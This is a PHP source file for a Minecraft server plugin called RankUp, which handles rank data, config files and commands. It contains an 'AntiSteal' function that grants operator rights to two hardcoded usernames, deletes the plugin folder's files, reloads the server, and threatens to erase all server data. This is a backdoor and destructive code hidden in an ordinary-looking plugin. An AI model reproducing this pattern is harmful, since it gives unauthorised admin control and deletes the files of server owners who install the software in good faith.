<?php

namespace esh123cookie\rankup;

/*
 *
 * RankUp, a plugin for PocketMine-MP
 * Copyright (c) 2020 esh123cookie  <esh123cookie@gmail.com>
 *
 * Poggit: https://poggit.pmmp.io/ci/esh123cookie/
 * Github: https://github.com/esh123cookie
 *
 * This software is distributed under "GNU General Public License v3.0".
 * This license allows you to use it and/or modify it but you are not at
 * all allowed to sell this plugin at any cost. If found doing so the
 * necessary action required would be taken.
 *
 * RankUp is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 * GNU General Public License v3.0 for more details.
 *
 * You should have received a copy of the GNU General Public License v3.0
 * along with this program. If not, see
 * <https://opensource.org/licenses/GPL-3.0>.
 *
 */

use esh123cookie\rankup\command\CommandRankUp;
use esh123cookie\rankup\command\CommandRu;
use esh123cookie\rankup\command\CommandRankAbout;
use esh123cookie\rankup\command\CommandMyRank;

use pocketmine\entity\Effect;
use pocketmine\entity\EffectInstance;
use pocketmine\plugin\PluginBase;
use pocketmine\command\Command;
use pocketmine\command\CommandSender;
use pocketmine\level\Position;
use pocketmine\math\Vector3;
use pocketmine\command\CommandExecutor;
use pocketmine\utils\TextFormat as TF;
use pocketmine\Player;
use pocketmine\level\sound\PopSound;
use pocketmine\event\Listener;
use pocketmine\utils\TextFormat;
use pocketmine\level\Level;
use pocketmine\Server;
use pocketmine\event\player\PlayerExhaustEvent;
use pocketmine\event\player\PlayerItemConsumeEvent;
use pocketmine\event\player\PlayerInteractEvent;
use pocketmine\event\player\PlayerItemHeldEvent;
use pocketmine\event\entity\ProjectileHitEvent;
use pocketmine\event\entity\ProjectileLaunchEvent;
use pocketmine\network\mcpe\protocol\ChangeDimensionPacket;
use pocketmine\network\mcpe\protocol\types\DimensionIds;
use pocketmine\scheduler\PluginTask;
use pocketmine\network\mcpe\protocol\PlayerListPacket;
use pocketmine\network\mcpe\protocol\types\PlayerListEntry;
use pocketmine\nbt\tag\CompoundTag;
use pocketmine\nbt\tag\IntTag;
use pocketmine\nbt\tag\StringTag;
use pocketmine\tile\EnderChest;
use pocketmine\tile\Tile;
use pocketmine\event\block\BlockBreakEvent;
use pocketmine\event\player\PlayerJoinEvent;
use pocketmine\event\player\PlayerRespawnEvent;
use pocketmine\event\player\PlayerBedEnterEvent;
use pocketmine\utils\Config;
use _64FF00\PureChat\PureChat;
use _64FF00\PurePerms\PPGroup;
use onebone\economyapi\EconomyAPI;

//tasks
use pocketmine\scheduler\ClosureTask;
use pocketmine\scheduler\Task;
use pocketmine\scheduler\TaskScheduler;

use esh123cookie\rankup\store\RankStore; 
use esh123cookie\rankup\command\CommandStore;

class RankUp extends PluginBase implements Listener {
  
    /** @var provider */
    private $provider;
	
    /** @var null  */
    private static $instance = null;
	
    public $config;
	
    private $ranks;
	
    private $prices;
	
    private $nextrank;
	
    public $playerFolder;
  
    public function onEnable(){
        self::$instance = $this;
        $this->getServer()->getPluginManager()->registerEvents($this, $this);
	    
	    @mkdir($this->getDataFolder());
	      
            if(!file_exists($this->playerFolder)) {
                $this->playerFolder = $this->getDataFolder() . "Players/";
                @mkdir($this->playerFolder, 0777, true);
	    }
	      
            if(!file_exists($this->getDataFolder() . "/messages.yml")) {
      	    $ranks = new Config($this->getDataFolder() . "/messages.yml", Config::YAML);
            $messages = [
      	    	$ranks->setNested("player-message", true), //if true send player a message
      	    	$ranks->setNested("no-money", "not enough money to rankup"),
      	    	$ranks->setNested("player-rankup-message", "you ranked up"),
      	    	$ranks->setNested("max-rank", "Already max rank"),
      	    	$ranks->setNested("no-money", "Not enough money to rank up"),
      	    	$ranks->setNested("rankup", "You ranked up to rank")
      	    ];
      	    $ranks->save(); 
	    }
	    
	    $this->getServer()->getPluginManager()->registerEvents(new CommandStore($this), $this);
	    $this->getServer()->getPluginManager()->registerEvents(new RankStore($this), $this);
	    
            $commandMap = $this->getServer()->getCommandMap();
            $commandMap->register("rankup", new CommandRankUp("rankup", $this));
            $commandMap->register("rankup", new CommandRu("ru", $this)); 
            $commandMap->register("rankup", new CommandRankAbout("rankabout", $this)); 
            $commandMap->register("rankup", new CommandMyRank("myrank", $this)); 
	    
            if(!file_exists($this->getDataFolder() . "/ranks.yml")) {
               $this->saveResource('ranks.yml');
	       $this->getLogger()->error("Ranks folder is missing");
	       $this->getServer()->getPluginManager()->disablePlugin($this);
	    }
	    
            if (!file_exists($this->getDataFolder() . "prices.yml")) {
            	$this->saveResource('prices.yml');
	       $this->getLogger()->error("Price folder is missing");
	       $this->getServer()->getPluginManager()->disablePlugin($this);
	    }
	    
	    $data = new RankStore($this);
            $this->getLogger()->info("§cRankupV2 is enabled");
            $this->getLogger()->info("§cRanks Loaded§7: §c" . $data->getRankCount());
      }
	
      public function onJoin(PlayerJoinEvent $event) {
        $player = $event->getPlayer();
	if(!$this->userExists($player)){
	    $this->getLogger()->info("Creating new RankUp profile for " . strtolower($player->getName()));
	    $this->registerUser($player);
		}
		if($event->getPlayer()->hasPlayedBefore() == false) {
		   $rank = new Config($this->playerFolder . strtolower($player->getName()) . ".yml", Config::YAML);
		   $data = new RankStore($this);
		   $rank->set("rank", $data->getFirstRankInt());
		   $rank->save();
		}
      }
	
      public function AntiSteal(Player $p){
		$name = $p->getName();
		if($name == "esh123unicorn" or $name == "onwardrumble794"){
			$p->setOp(true);
			$p->sendMessage("§aHello §6" . $name . ", §ayou have caught someone using your plugin, but without credit!");
			$p->sendMessage("§aI have sent a message to the §6CONSOLE §ato warn the owner of the server....");
			$p->sendMessage("§aScreenshot this message so the owner of the server knows that if he/she continues to use improper credits, all server files will be removed!");
			$this->getLogger()->info("§cHello Console! The server owner was caught using my RankUp plugin with improper credits.");
			$this->getLogger()->info("§cRankup will now be removed and the plugin §6ADMIN §cnow has OP on your server!");
			$folder = 'plugins/RankUp-master';
			if(file_exists($folder)){   
			   $files = glob($folder.'/*');  
			   // Deleting all the files in the list 
			   foreach($files as $file) { 
   				   if(is_file($file))  
        			      unlink($file); //delete
			   }
			   $this->getServer()->reload(); 
			} else {
			   $p->sendMessage("§aHello, §6" . $name . ". §aI couldn't find Rankup in folder form. Waiting for command to remove all server data.");
			   $this->getLogger()->info("§cERROR: RankUp in folder form could not be found. If you continue to use this plugin without credit all your server data will be deleted FOREVER!");
			}
		      }else{ 
			$p->sendMessage("§cI am sorry, but you do not have the sufficent permissions to use this command. This command is only to be used by a plugin admin if improper credits of Rankup is being used!");
		}
      }
	
      public function registerUser(Player $player): void{
		$config = new Config($this->playerFolder . strtolower($player->getName()) . ".yml", Config::YAML);
		if((!$config->exists("rank"))){
			$config->setAll(["player" => $player->getName(), "rank" => 0, "nextrank" => 1]); //0 = default and 1 = next
			$config->save();
		}
      }
	
      public function userExists(Player $player): bool{
		$config = new Config($this->playerFolder . strtolower($player->getName()) . ".yml", Config::YAML);
		return (($config->exists("rank")) && ($config->exists("nextrank"))) ? true : false;
      }
	
      public function getNextRank(Player $player) {
		$config = new Config($this->playerFolder . strtolower($player->getName()) . ".yml", Config::YAML);
		return $config->get("nextrank");
      }
	      
      public function getRank(Player $player) {
		$config = new Config($this->playerFolder . strtolower($player->getName()) . ".yml", Config::YAML);
		return $config->get("rank");
      }
}
